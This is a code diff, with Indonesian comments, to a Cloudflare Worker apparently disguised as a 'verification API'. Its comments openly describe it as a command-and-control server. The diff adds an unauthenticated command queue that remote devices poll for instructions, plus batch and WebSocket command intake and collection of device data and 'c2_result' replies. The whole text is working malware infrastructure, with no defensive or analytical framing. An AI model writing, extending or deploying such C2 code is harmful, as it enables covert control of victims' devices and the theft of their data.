@@ -1,5 +1,5 @@
 // ================================================================
-// Cloudflare Worker - verifikasi-api (FULL - TANPA AUTH UNTUK C2!)
+// Cloudflare Worker - verifikasi-api (FULL - DENGAN QUEUE C2!)
 // ================================================================
 
 // ============================================================
@@ -127,18 +127,27 @@ async function handlePostData(request, env) {
       return jsonResponse({ error: 'Invalid request body' }, 400);
     }
     
-    // 🔥 C2 COMMAND DARI DASHBOARD (TANPA AUTH!)
+    // 🔥 C2 COMMAND DARI DASHBOARD (TANPA AUTH!) - SIMPAN KE QUEUE!
     if (body.sumber === 'c2_command' || body.type === 'c2_command') {
       const cmdData = body.data || body;
       cmdData.timestamp = Date.now();
       cmdData.status = 'pending';
+      cmdData.id = 'cmd_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
       
+      // 🔥 SIMPAN KE QUEUE (BUKAN LANGSUNG KE perintah!)
+      var queueRaw = await env.DATA.get('perintah_queue') || '[]';
+      var queue = JSON.parse(queueRaw);
+      queue.push(cmdData);
+      await env.DATA.put('perintah_queue', JSON.stringify(queue));
+      
+      // 🔥 TETAP SIMPAN DI perintah UNTUK FALLBACK (1 PERINTAH TERAKHIR)
       await env.DATA.put('perintah', JSON.stringify(cmdData));
       
       return jsonResponse({ 
         status: 'ok', 
         type: 'c2', 
-        command: cmdData.aksi 
+        command: cmdData.aksi,
+        queueLength: queue.length
       });
     }
     
@@ -186,17 +195,19 @@ async function handleBatchCommand(request, env) {
     var success = 0;
     var failed = 0;
     
+    // 🔥 AMBIL QUEUE YANG SUDAH ADA
+    var queueRaw = await env.DATA.get('perintah_queue') || '[]';
+    var queue = JSON.parse(queueRaw);
+    
     for (var i = 0; i < body.commands.length; i++) {
       try {
         var cmd = body.commands[i];
         cmd.timestamp = Date.now();
         cmd.status = 'pending';
-        cmd.id = 'cmd_' + Date.now() + '_' + i;
+        cmd.id = 'cmd_' + Date.now() + '_' + i + '_' + Math.random().toString(36).substr(2, 3);
         
-        var queueRaw = await env.DATA.get('perintah_queue') || '[]';
-        var queue = JSON.parse(queueRaw);
+        // 🔥 TAMBAHKAN KE QUEUE
         queue.push(cmd);
-        await env.DATA.put('perintah_queue', JSON.stringify(queue));
         
         success++;
         results.push({ index: i, status: 'ok', command: cmd.aksi });
@@ -206,11 +217,23 @@ async function handleBatchCommand(request, env) {
       }
     }
     
+    // 🔥 SIMPAN QUEUE YANG SUDAH DIUPDATE
+    await env.DATA.put('perintah_queue', JSON.stringify(queue));
+    
+    // 🔥 SIMPAN PERINTAH TERAKHIR DI perintah (FALLBACK)
+    if (body.commands.length > 0) {
+      const lastCmd = body.commands[body.commands.length - 1];
+      lastCmd.timestamp = Date.now();
+      lastCmd.status = 'pending';
+      await env.DATA.put('perintah', JSON.stringify(lastCmd));
+    }
+    
     return jsonResponse({
       status: 'ok',
       total: body.commands.length,
       success: success,
       failed: failed,
+      queueLength: queue.length,
       results: results
     });
     
@@ -225,14 +248,15 @@ async function handleBatchCommand(request, env) {
 async function handleGetData(request, env) {
   const url = new URL(request.url);
   
-  // 🔥 DEVICE AMBIL PERINTAH C2 (TANPA AUTH!) - SUPPORT BATCH!
+  // 🔥 DEVICE AMBIL PERINTAH C2 (TANPA AUTH!) - PRIORITAS QUEUE!
   if (url.searchParams.get('type') === 'perintah') {
     try {
+      // 1️⃣ AMBIL DARI QUEUE DULU
       var queueRaw = await env.DATA.get('perintah_queue') || '[]';
       var queue = JSON.parse(queueRaw);
       
       if (queue.length > 0) {
-        var cmd = queue.shift();
+        var cmd = queue.shift(); // Ambil perintah pertama
         await env.DATA.put('perintah_queue', JSON.stringify(queue));
         
         return new Response(JSON.stringify(cmd), {
@@ -243,6 +267,7 @@ async function handleGetData(request, env) {
         });
       }
       
+      // 2️⃣ FALLBACK: CEK PERINTAH TUNGGAL
       const perintah = await env.DATA.get('perintah');
       if (perintah) {
         await env.DATA.delete('perintah');
@@ -340,15 +365,24 @@ async function handleWebSocket(request, env) {
         return;
       }
 
+      // COMMAND DARI DASHBOARD (TANPA AUTH!) - SIMPAN KE QUEUE!
       if (data.type === 'command') {
+        var cmdData = data.command;
+        cmdData.timestamp = Date.now();
+        cmdData.status = 'pending';
+        cmdData.id = 'cmd_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
+        
         var queueRaw = await env.DATA.get('perintah_queue') || '[]';
         var queue = JSON.parse(queueRaw);
-        queue.push(data.command);
+        queue.push(cmdData);
         await env.DATA.put('perintah_queue', JSON.stringify(queue));
-        server.send(JSON.stringify({ type: 'command_received' }));
+        await env.DATA.put('perintah', JSON.stringify(cmdData));
+        
+        server.send(JSON.stringify({ type: 'command_received', queueLength: queue.length }));
         return;
       }
 
+      // DATA DARI DEVICE
       if (data.type === 'data') {
         const raw = await env.DATA.get('data') || '[]';
         let allData = JSON.parse(raw);
@@ -366,6 +400,7 @@ async function handleWebSocket(request, env) {
         return;
       }
 
+      // C2 RESULT
       if (data.type === 'c2_result') {
         const raw = await env.DATA.get('data') || '[]';
         let allData = JSON.parse(raw);
@@ -383,6 +418,7 @@ async function handleWebSocket(request, env) {
         return;
       }
 
+      // PING/PONG
       if (data.type === 'ping') {
         server.send(JSON.stringify({ type: 'pong', timestamp: data.timestamp }));
         return;
